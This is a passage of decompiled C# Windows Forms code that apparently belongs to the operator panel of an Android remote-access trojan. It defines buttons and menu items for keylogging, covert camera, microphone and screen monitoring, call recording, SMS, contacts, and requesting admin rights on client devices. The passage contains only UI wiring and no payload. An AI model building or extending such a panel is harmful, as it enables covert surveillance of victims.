	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon13
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon13;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon13_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon13;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon13 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon13;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon12
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon12;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon12_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon12;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon12 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon12;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("label16")]
	internal virtual Label label16
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ctxconnection")]
	internal virtual DrakeUIContextMenuStrip ctxconnection
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem BlockClientToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _BlockClientToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = BlockClientToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _BlockClientToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_BlockClientToolStripMenuItem = value;
			toolStripMenuItem = _BlockClientToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("blockpanel")]
	internal virtual DrakeUITitlePanel blockpanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DGVblocked")]
	public virtual DataGridView DGVblocked
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DataGridViewImageColumn1")]
	internal virtual DataGridViewImageColumn DataGridViewImageColumn1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DataGridViewTextBoxColumn1")]
	internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("blockctx")]
	internal virtual DrakeUIContextMenuStrip blockctx
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem1
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem1_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem1;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem1 = value;
			toolStripMenuItem = _ToolStripMenuItem1;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual DrakeUIAvatar clearsrchbtn
	{
		[CompilerGenerated]
		get
		{
			return _clearsrchbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Clearsrchbtn_Click;
			DrakeUIAvatar drakeUIAvatar = _clearsrchbtn;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_clearsrchbtn = value;
			drakeUIAvatar = _clearsrchbtn;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolTips")]
	internal virtual DrakeUIToolTip ToolTips
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DataGridViewImageColumn2")]
	internal virtual DataGridViewImageColumn DataGridViewImageColumn2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DataGridViewTextBoxColumn5")]
	internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DataGridViewTextBoxColumn4")]
	internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DataGridViewTextBoxColumn7")]
	internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("dattim")]
	internal virtual DataGridViewTextBoxColumn dattim
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon supportbtn
	{
		[CompilerGenerated]
		get
		{
			return _supportbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon1_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _supportbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_supportbtn = value;
			drakeUIButtonIcon = _supportbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon locationbtn
	{
		[CompilerGenerated]
		get
		{
			return _locationbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Locationbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _locationbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_locationbtn = value;
			drakeUIButtonIcon = _locationbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon keyloggerbtn
	{
		[CompilerGenerated]
		get
		{
			return _keyloggerbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Keyloggerbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _keyloggerbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_keyloggerbtn = value;
			drakeUIButtonIcon = _keyloggerbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon callsbtn
	{
		[CompilerGenerated]
		get
		{
			return _callsbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Callsbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _callsbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_callsbtn = value;
			drakeUIButtonIcon = _callsbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon micbtn
	{
		[CompilerGenerated]
		get
		{
			return _micbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Micbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _micbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_micbtn = value;
			drakeUIButtonIcon = _micbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon accountbtn
	{
		[CompilerGenerated]
		get
		{
			return _accountbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Accountbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _accountbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_accountbtn = value;
			drakeUIButtonIcon = _accountbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon camerabtn
	{
		[CompilerGenerated]
		get
		{
			return _camerabtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Camerabtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _camerabtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_camerabtn = value;
			drakeUIButtonIcon = _camerabtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon applicationsbtn
	{
		[CompilerGenerated]
		get
		{
			return _applicationsbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Applicationsbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _applicationsbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_applicationsbtn = value;
			drakeUIButtonIcon = _applicationsbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon screenbtn
	{
		[CompilerGenerated]
		get
		{
			return _screenbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Screenbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _screenbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_screenbtn = value;
			drakeUIButtonIcon = _screenbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon contactbtn
	{
		[CompilerGenerated]
		get
		{
			return _contactbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Contactbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _contactbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_contactbtn = value;
			drakeUIButtonIcon = _contactbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon screenreadbtn
	{
		[CompilerGenerated]
		get
		{
			return _screenreadbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Screenreadbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _screenreadbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_screenreadbtn = value;
			drakeUIButtonIcon = _screenreadbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon filebtn
	{
		[CompilerGenerated]
		get
		{
			return _filebtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Filebtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _filebtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_filebtn = value;
			drakeUIButtonIcon = _filebtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon smsbtn
	{
		[CompilerGenerated]
		get
		{
			return _smsbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Smsbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _smsbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_smsbtn = value;
			drakeUIButtonIcon = _smsbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon2
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon2_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon2;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon2 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon2;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel5")]
	internal virtual Panel Panel5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("callspanel")]
	internal virtual DrakeUITitlePanel callspanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("notifispanel")]
	internal virtual DrakeUITitlePanel notifispanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DGVNOTF")]
	internal virtual DataGridView DGVNOTF
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("mappanel")]
	internal virtual DrakeUITitlePanel mappanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("MapPannel")]
	internal virtual Panel MapPannel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel2")]
	internal virtual Panel Panel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DGVCALLS")]
	internal virtual DataGridView DGVCALLS
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DataGridViewImageColumn3")]
	internal virtual DataGridViewImageColumn DataGridViewImageColumn3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DataGridViewTextBoxColumn2")]
	internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("cliimg")]
	internal virtual DataGridViewImageColumn cliimg
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("notitext")]
	internal virtual DataGridViewTextBoxColumn notitext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ctxmenu")]
	internal virtual DrakeUIContextMenuStrip ctxmenu
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ManagersToolStripMenuItem")]
	internal virtual ToolStripMenuItem ManagersToolStripMenuItem
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem FilesToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _FilesToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = FilesToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _FilesToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_FilesToolStripMenuItem = value;
			toolStripMenuItem = _FilesToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem SMSToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _SMSToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = SMSToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _SMSToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_SMSToolStripMenuItem = value;
			toolStripMenuItem = _SMSToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem CallsToolStripMenuItem1
	{
		[CompilerGenerated]
		get
		{
			return _CallsToolStripMenuItem1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CallsToolStripMenuItem1_Click;
			ToolStripMenuItem toolStripMenuItem = _CallsToolStripMenuItem1;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_CallsToolStripMenuItem1 = value;
			toolStripMenuItem = _CallsToolStripMenuItem1;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ContactsToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _ContactsToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ContactsToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _ContactsToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ContactsToolStripMenuItem = value;
			toolStripMenuItem = _ContactsToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem AccountsToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _AccountsToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = AccountsToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _AccountsToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_AccountsToolStripMenuItem = value;
			toolStripMenuItem = _AccountsToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ApplicationsToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _ApplicationsToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ApplicationsToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _ApplicationsToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ApplicationsToolStripMenuItem = value;
			toolStripMenuItem = _ApplicationsToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem12
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem12;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem12_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem12;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem12 = value;
			toolStripMenuItem = _ToolStripMenuItem12;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripSeparator1")]
	internal virtual ToolStripSeparator ToolStripSeparator1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("MonitorsToolStripMenuItem")]
	internal virtual ToolStripMenuItem MonitorsToolStripMenuItem
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem ScreenMonitorToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _ScreenMonitorToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ScreenMonitorToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _ScreenMonitorToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ScreenMonitorToolStripMenuItem = value;
			toolStripMenuItem = _ScreenMonitorToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ScreenReaderToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _ScreenReaderToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ScreenReaderToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _ScreenReaderToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ScreenReaderToolStripMenuItem = value;
			toolStripMenuItem = _ScreenReaderToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem CameraMonitorToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _CameraMonitorToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CameraMonitorToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _CameraMonitorToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_CameraMonitorToolStripMenuItem = value;
			toolStripMenuItem = _CameraMonitorToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem MicrophoneMonitorToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _MicrophoneMonitorToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = MicrophoneMonitorToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _MicrophoneMonitorToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_MicrophoneMonitorToolStripMenuItem = value;
			toolStripMenuItem = _MicrophoneMonitorToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem KeyloggerToolStripMenuItem1
	{
		[CompilerGenerated]
		get
		{
			return _KeyloggerToolStripMenuItem1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = KeyloggerToolStripMenuItem1_Click;
			ToolStripMenuItem toolStripMenuItem = _KeyloggerToolStripMenuItem1;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_KeyloggerToolStripMenuItem1 = value;
			toolStripMenuItem = _KeyloggerToolStripMenuItem1;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("LocationsMonitorToolStripMenuItem")]
	internal virtual ToolStripMenuItem LocationsMonitorToolStripMenuItem
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem LiveModeToolStripMenuItem1
	{
		[CompilerGenerated]
		get
		{
			return _LiveModeToolStripMenuItem1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = LiveModeToolStripMenuItem1_Click;
			ToolStripMenuItem toolStripMenuItem = _LiveModeToolStripMenuItem1;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_LiveModeToolStripMenuItem1 = value;
			toolStripMenuItem = _LiveModeToolStripMenuItem1;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripSeparator2")]
	internal virtual ToolStripSeparator ToolStripSeparator2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem SilentModeGOIPToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _SilentModeGOIPToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = SilentModeGOIPToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _SilentModeGOIPToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_SilentModeGOIPToolStripMenuItem = value;
			toolStripMenuItem = _SilentModeGOIPToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem WebBrowserToolStripMenuItem1
	{
		[CompilerGenerated]
		get
		{
			return _WebBrowserToolStripMenuItem1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = WebBrowserToolStripMenuItem1_Click;
			ToolStripMenuItem toolStripMenuItem = _WebBrowserToolStripMenuItem1;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_WebBrowserToolStripMenuItem1 = value;
			toolStripMenuItem = _WebBrowserToolStripMenuItem1;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem CallRecorderToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _CallRecorderToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = CallRecorderToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _CallRecorderToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_CallRecorderToolStripMenuItem = value;
			toolStripMenuItem = _CallRecorderToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem3
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem3_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem3;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem3 = value;
			toolStripMenuItem = _ToolStripMenuItem3;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripSeparator3")]
	internal virtual ToolStripSeparator ToolStripSeparator3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("AdminToolStripMenuItem")]
	internal virtual ToolStripMenuItem AdminToolStripMenuItem
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem RequestAdminRightsToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _RequestAdminRightsToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = RequestAdminRightsToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _RequestAdminRightsToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_RequestAdminRightsToolStripMenuItem = value;
			toolStripMenuItem = _RequestAdminRightsToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem LockScreenToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _LockScreenToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = LockScreenToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _LockScreenToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_LockScreenToolStripMenuItem = value;
			toolStripMenuItem = _LockScreenToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem2
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem2_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem2;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem2 = value;
